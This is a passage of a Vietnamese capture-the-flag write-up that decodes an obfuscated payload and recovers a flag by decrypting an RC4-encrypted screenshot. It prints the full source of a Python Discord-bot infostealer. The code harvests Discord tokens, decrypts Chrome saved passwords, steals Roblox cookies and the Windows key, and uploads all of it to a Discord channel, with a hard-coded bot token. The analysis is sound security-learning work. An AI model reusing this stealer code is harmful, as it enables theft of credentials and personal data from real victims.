WYj9GTcx1Jg0zKggGdhBHIgACIKoTKoRXYwhiZmlmbzBiZlRmCK01JBRVQEBFUBxUQD9ETnslbvJXa25WZuM3bg0DIQRUQKcSY0FGRg4Wan9GTcRHb1FmZlREXhRXYEBiclNXVcVWbvJHaDxVZsd2bvd0JyBSPgAlQEpgC9pQXgACIgoQfgACIgACIgAiCdBCIgACIgACIgACIgoQfgACIgACIgACIgACIgACIgogI9RXaoNHbhVmc7BiOuV2avRlImBiOiUWdsFmdiACIgACIgACIgACIgACIgACIgACIKwiIu9Wa0FWby9mZulGIkJ3bjNXaEJCI6ISZtFmbiACIgACIgACIgACIgACIgACIgACIKsHIgACIgACIgACIgACIgACIKsFI6IyckxWZpZmIgACIgACIgACIgACIKwCO3MDM0QzNgojIy9GbvNmIgACIgACIgACIgACIKsHIgACIgACIgoAL9BCIgACIgACIK0FIgACIgACIgACIgAiC9BCIgACIgACIgACIgACIgAiCi0XK2NWZy91clRXei5ybp9Fdl5GKlxWYjN3egoDZlZXalNWZSBCbhR3bU5GX9lCduV2cfNXZ0lnYu8WafRXZuhSZsF2YztHI6QnblNFIsFGdvRlImBiOiUWdsFmdiACIgACIgACIgACIgACIgACIgACIKwiIu9Wa0FWby9mZulEIrJ3b3RXZOJCI6ISZtFmbiACIgACIgACIgACIgACIgACIgACIKsHIgACIgACIgACIgACIgACIKwSfgACIgACIgACIgACIgACIgogI9lyclRXei9VZ0lmc35ybp91azlGZoUGbhN2c7BiOlRXaydHIsFGdvRlbc1XKzVGd5J2XkFWZy5ybp91azlGZoUGbhN2c7BiOkFWZyBCbhR3bU5GXuxVJ9RnblNmclBnLldWYzV3Xu9Wa0lGdyFGc7BiOldWY05WZjJXZQ5GX9lSZlJnZuU2ZhNXdf52bpRXa0JXYwhSZsF2YztHI6UWZyZkbc1XKkV2c15SZnF2c19lbvlGdpRnchBHKlxWYjN3egoDZlNXVuxVfpwWY09GduU2ZhNXdf52bpRXa0JXYwhSZsF2YztHI6UmepNFIsFGdvRlImBiOiUWdsFmdiACIgACIgACIgACIgACIgACIgACIKwiIu9Wa0FWby9mZulEIrNXaEJCI6ISZtFmbiACIgACIgACIgACIgACIgACIgACIKsHIgACIgACIgACIgACIgACIKwSfgACIgACIgACIgACIgACIgogIl0HduV2YyVGcu0WZtZ3c7BiOldWY05WZjJXZQ5GX9lCZlNXdu0WZtZ3coUGbhN2c7BiOkV2cV5GX9lSZsJWYslWY2FmLtVWb2NHKlxWYjN3egoTZsJWYslWY2Fkbc1XKsFGdvRnLtVWb2NHKlxWYjN3egoDbhR3bUJiZgojIlVHbhZnIgACIgACIgACIgACIgACIgACIgAiCsIibvlGdh1mcvZmbJBSey9Wbl1kIgojIl1WYuJCIgACIgACIgACIgACIgACIgACIgowegACIgACIgACIgACIgACIgoAL9BCIgACIgACIgACIgACIgAiCi4GX9lCK05WZjJXZw9VdwNmLslGd1NHc7BiOldWYzVHIVB1QgwWY09GVuxlbcpHaN1nZy4iOulWbuEXZyZWdwN2egoTej5WZ1FXZyZEIulWTuxleo1UfmJjL6gXYt5SclJnZ1B3Y7BiO5NmblVXclJnRggXYN5GXuxVfpUWdyRVPsF2Ypd2bshCduV3bj9VdwNmLslGd1NHc7BiOzVmcvNEIsFGdvRlbc1XKlNHbhZUPsF2Ypd2bshCduV3bj9VdwNmLslGd1NHc7BiOzVmcvNGIsF2Yph2Y5NHUiYGI6ISZ1xWY2JCIgACIgACIgACIgACIgACIgACIgoALi42bpRXYtJ3bm5WSgUFUDJCI6ISZtFmbiACIgACIgACIgACIgACIgACIgACIKsHIgACIgACIgACIgACIgACIKsFI6IyckxWZpZmIgACIgACIgACIgACIKwiM2YTOwETNxAiOiI3bs92YiACIgACIgACIgACIgowegACIgACIgAiCs0HIgACIgACIgoQXgACIgACIgACIgACIK0HIgACIgACIgACIgACIgACIKISfk52bjV2cuQnY7pTflRXdulWbuQnY7pTfyV3bo5CditHI9lXYk5Cdit3L9hGdu9WbuQnY79SfyFWZ55CditHI6UWbpRFI092bC5GXuxVfy92czV2YvJHcuUWbh5Wd7BiOy92czV2YvJHUuxVfl5WaoNWYt5SZtFmb1tHI6Umbph2Yh1kbc1XZk9mbuUWbh5Wd7BiOlR2bO5GX91WZ0NXez5SZtFmb1tHI60WZ0NXeTJiZgojIlVHbhZnIgACIgACIgACIgACIgACIgACIgAiCsIibvlGdh1mcvZmbJBSblR3c5NlIgojIl1WYuJCIgACIgACIgACIgACIgACIgACIgowegACIgACIgACIgACIgACIgowWgojIzRGbllmZiACIgACIgACIgACIgowegACIgACIgAiCs0HIgACIgACIgoQXgACIgACIgACIgACIK0HIgACIgACIgACIgACIgACIKIibc5GXuxlbc1Xej5WZyJXdjtHI6k3YuVmcyV3QuxVfsFGdz9Gc7BCfg0Xe0l2Y7BiO5RXaD5GX952bpdWZytHI642bpdWZy5GX9VmbvpXZtlGd7BCfg03Yvx2egwHI9lnc05WdvN2egoTeyRnb192Quxlbc13Yh12egozczVmckFEIDFUTuxVfwl2YpxmY1B3egoDUJByYpxmY1Blbc1HcpxWYj9Gb7BiOQlEIsF2Yvxkbc1Xe49mcwtHI68jTQZFIn5WazVlImBiOiUWdsFmdiACIgACIgACIgACIgACIgACIgACIKwiIu9Wa0F2Yvx0bldkIgojIl1WYuJCIgACIgACIgACIgACIgACIgACIgowegACIgACIgACIgACIgACIgowWgojIzRGbllmZiACIgACIgACIgACIgoAL0kzM2ATN3AiOiI3bs92YiACIgACIgACIgACIgowegACIgACIgAiCs0HIgACIgACIgoAO2UTM4cDOgojIy9GbvNmIgACIgACIgACIgACIKwiI9R3cvh2eg0CIh0WZ0R3bHBCahhkImBiOiUGb0lGdiACIgACIgACIgACIgowegACIgACIgAiCbBiOiMHZlJWblJCIgACIKsHI9Aybm5Waf1WZ0NXezpgClVnbpRnbvNGIgACIgACIgogOy9mcyVkbvl2czlWbyVGUgQHclNGelBCIgAiCrFWZyJGIgACIgACIgoQK05WavBHduV3bt5ibvlGdpRnchBHKldWYzV3XrNXak5CbpRXdzBHI9ASZnF2c19lbvlGdpRnchBHIgACIgACIgogO5JHdgACIgogOz52bpRXa0JXYwBibpBibvlGdpRnchBHIy9mZKUmbv5EI9ASZnF2c19lbvlGdpRnchBnCpgycu9Wa0lGdyFGcft2cpRmLslGd1NHcg0DIz52bpRXa0JXYwpgCpgycyVGduV3bj91bp9Fdl5mLslGd1NHcg0DIvl2X0VmbKkCKzJXZ05WdvN2Xvl2XrNXak5CbpRXdzBHI9Aybp91azlGZKkCKz52bpRXa0JXYw91azlGZuwWa0V3cwBSPgMnbvlGdpRnchBnCpgSey9Wbl12XsFWd0JXa25CbpRXdzBHI9ASbl1mdzpQKoEXZyZ2X1B3YuwWa0V3cwBSPgEXZyZWdwNmCKIibc1nblt2bUtnImBSPrACdph2csFWZyBCIgACIgACIgACIgACIgAiC6Mnblt2bUBibpBiblt2bUBicvZGIgACIgACIgACIgAiC6ADI' # payload trong b'....'
decoded = base64.b64decode(data[::-1])
print(decoded.decode(errors='ignore'))

```

* code giải mã ở lần cuối cùng
* từ đây ta sẽ thấy được payload 

```
 0:
            for Token in Tokens:
                realshit += f"{Token}\n"

cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
partition_usage = None
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
        break
    except PermissionError:
        continue

system_info = {
    "embeds": [
        {
            "title": f"Hah Gottem! - {host}",
            "color": 8781568
        },
        {
            "color": 7506394,
            "fields": [
                {
                    "name": "GeoLocation",
                    "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {loc} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n"
                }
            ]
        },
        {
            "fields": [
                {
                    "name": "System Information",
                    "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
                }
            ]
        },
        {
            "color": 15109662,
            "fields": [
                {
                    "name": "CPU Information",
                    "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n"
                },
                {
                    "name": "Memory Information",
                    "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%"
                },
                {
                    "name": "Disk Information",
                    "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}"
                },
                {
                    "name": "Network Information",
                    "value": f"Total Sent: {scale(net_io.bytes_sent)}\nTotal Received: {scale(net_io.bytes_recv)}"
                }
            ]
        },
        {
            "color": 7440378,
            "fields": [
                {
                    "name": "Discord information",
                    "value": f"Token: {realshit}"
                }
            ]
        }
    ]
}

DBP = r'Google\Chrome\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']

def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
        
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        print(f"Could not find channel with ID: {CHANNEL_ID}")
        return
    
    main = chrome()
    try:
        main.chromedb()
    except Exception as e:
        print(f"Error getting Chrome passwords: {e}")
    main.saved()
    
    await exfiltrate_data(channel)
    
    await bot.close()

async def exfiltrate_data(channel):
    try:
        hostname = requests.get("https://ipinfo.io/ip").text
    except:
        hostname = "Unknown"
    
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'
        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass
        message += '```'

    try:
        from PIL import ImageGrab
        from Crypto.Cipher import ARC4
        screenshot = ImageGrab.grab()
        screenshot_path = os.getenv('ProgramData') + r'\pay2winflag.jpg'
        screenshot.save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            image_data = f.read()

        key = b'tralalero_tralala'
        cipher = ARC4.new(key)
        encrypted_data = cipher.encrypt(image_data)

        encrypted_path = screenshot_path + '.enc'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)

        await channel.send(f"Screenshot from {hostname} (Pay $500 for the key)", file=discord.File(encrypted_path))

    except Exception as e:
        print(f"Error taking screenshot: {e}")

    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        
        await channel.send(f"Passwords from {hostname}", file=discord.File(zname))
    except Exception as e:
        print(f"Error with password file: {e}")

    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except Exception as e:
        print(f"Error getting system info: {e}")
        usr = "Unknown"
        keys = "Unknown"
        types = "Unknown"

    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000
    roblox = "No Roblox cookies found"

    try:
        cookies.extend(list(steal.chrome()))
    except Exception as e:
        print(f"Error stealing Chrome cookies: {e}")

    try:
        cookies.extend(list(steal.firefox()))
    except Exception as e:
        print(f"Error stealing Firefox cookies: {e}")

    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```{z}```'
    except Exception as e:
        print(f"Error processing cookies: {e}")

    embed = discord.Embed(title=f"Data from {hostname}", description="A victim's data was extracted, here's the details:", color=discord.Color.blue())
    embed.add_field(name="Windows Key", value=f"User: {usr}\nType: {types}\nKey: {keys}", inline=False)
    embed.add_field(name="Roblox Security", value=roblox[:1024], inline=False)
    embed.add_field(name="Tokens", value=message[:1024], inline=False)
    
    await channel.send(embed=embed)
    
    with open(r'C:\ProgramData\system_info.json', 'w', encoding='utf-8') as f:
        json.dump(system_info, f, indent=4, ensure_ascii=False)
    
    await channel.send(file=discord.File(r'C:\ProgramData\system_info.json'))

    try:
        os.remove(r'C:\ProgramData\pay2winflag.jpg')
        os.remove(r'C:\ProgramData\pay2winflag.jpg.enc')
        os.remove(r'C:\ProgramData\passwords.zip')
        os.remove(r'C:\ProgramData\passwords.txt')
        os.remove(r'C:\ProgramData\system_info.json')
    except Exception as e:
        print(f"Error cleaning up: {e}")

BOT_TOKEN = "MTM2NDIzNDEzNjE5MzMzOTQyNA.GHC4yD.ZUzwkrAEMW9GlLsmVnP7FbdY317MqM234Bd2vE"
CHANNEL_ID = 1371505369230344273

if __name__ == "__main__":
    bot.run(BOT_TOKEN)

```

* code khá dài, ở đây nó sẽ lấy cắp dữ liệu của người dùng rồi mã hóa theo dạng ARC4 thì bạn chỉ cần chú ý đến đoạn mã hóa ảnh 

```
    key = b'tralalero_tralala'
    cipher = ARC4.new(key)
    ncrypted_data = cipher.encrypt(image_data)
```
* tới đây, sau khi bạn đọc mail sẽ có link discord, join vào link discord thì bạn có thể thấy được con bot trong discord đã lấy được thông tin của người dùng và gửi lên server và payload đó là payload cấu tạo ra con bot 

* sau khi tải về thì mình thấy file password không có gì cả, chỉ có ảnh và mình sẽ giải mã ảnh sau khi biết được key và dạng mã hóa 
```
from Crypto.Cipher import ARC4

key = b"tralalero_tralala"
with open("pay2winflag.jpg.enc", "rb") as f:
    encrypted = f.read()

cipher = ARC4.new(key)
decrypted = cipher.decrypt(encrypted)

with open("pay2winflag.jpg", "wb") as f:
    f.write(decrypted)

print("✅ Đã giải mã xong: pay2winflag.jpg")

```
![pay2winflag](https://hackmd.io/_uploads/SkFATfMIel.jpg)

flag cuối cùng: **L3AK{Br40d0_st34L3r_0r_br41nr0t}**
